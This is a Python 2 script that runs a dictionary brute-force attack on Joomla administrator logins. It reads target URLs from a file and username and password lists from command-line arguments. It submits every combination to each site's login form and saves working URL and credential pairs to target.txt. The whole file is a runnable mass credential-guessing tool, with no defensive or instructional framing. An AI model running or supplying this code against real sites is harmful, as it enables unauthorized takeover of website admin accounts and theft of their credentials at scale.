#!/usr/bin/python
import mechanize
import sys

error = ["Username and password do not match or you do not have an account yet.", "LADP","error404"]
sussuc = "Control Panel"
joomla = "form-login"
br = mechanize.Browser()
br.set_handle_robots(False)
fopen = open("/root/scanner/t.txt", "r")
username = open(sys.argv[1])
passw = open(sys.argv[2])
userlist = username.readlines()
passlist = passw.readlines()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

for line in fopen.readlines():
    logged = False
    #print bcolors.BOLD + line.strip()

    try:
        page = br.open(line.strip(), timeout=5)
        print bcolors.HEADER + "URL OPENED: " + bcolors.OKBLUE + line

    except:
        #print bcolors.WARNING + "Error ocurred"
        pass

    try:
        mainpage = br.response().read()
        if joomla in mainpage:
            print bcolors.OKBLUE + "login found"
            for form in br.forms():
                for u in userlist:
                    if logged == False:
                        for p in passlist:
                            try:
                                br.select_form(nr=0)
                                #print bcolors.UNDERLINE + "\n" + line + "trying user: %s and password: %s \n" % (u, p)
                                br.form["username"] = u
                                br.form["passwd"] = p
                                br.submit()
                                readingPage = br.response().read()
                                if sussuc in readingPage:
                                    logged = True
                                    print bcolors.OKGREEN + "succefully loggen in!\n ---------------------------------"
                                    print "Adding the Credential information to a new list file call (target.txt)......"
                                    target = open('target.txt', 'a')
                                    target.write('the URL address: ' + line + "\n user name: " + u + "\n and password: " + p + "\n =======================\n")
                                    target.close()
                                else:
                                    #print bcolors.FAIL + "Wrong credentials\n ----------------------------------------"
                                    continue
                            except:
                                pass

        else:
            #print bcolors.UNDERLINE + "no login page found!!"
            continue
    except:
        pass
passw.close()
username.close()
fopen.close()
